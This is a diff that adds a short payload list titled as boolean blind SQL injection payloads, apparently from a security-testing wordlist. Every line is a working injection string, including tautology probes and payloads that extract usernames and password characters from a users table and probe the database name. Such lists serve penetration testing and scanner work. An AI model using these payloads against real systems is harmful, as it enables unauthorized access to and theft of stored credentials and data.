@@ -1,0 +1,16 @@
+# SQL Injection - Boolean Blind Payloads
+' AND 1=1-- -
+' AND 1=2-- -
+1 AND 1=1
+1 AND 1=2
+' AND 'a'='a
+' AND 'a'='b
+1' AND 1=1--
+1' AND 1=2--
+' AND (SELECT 1)=1--
+' AND (SELECT 1)=2--
+1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
+' AND LENGTH(database())>0--
+' OR 1=1--
+' OR 1=2--
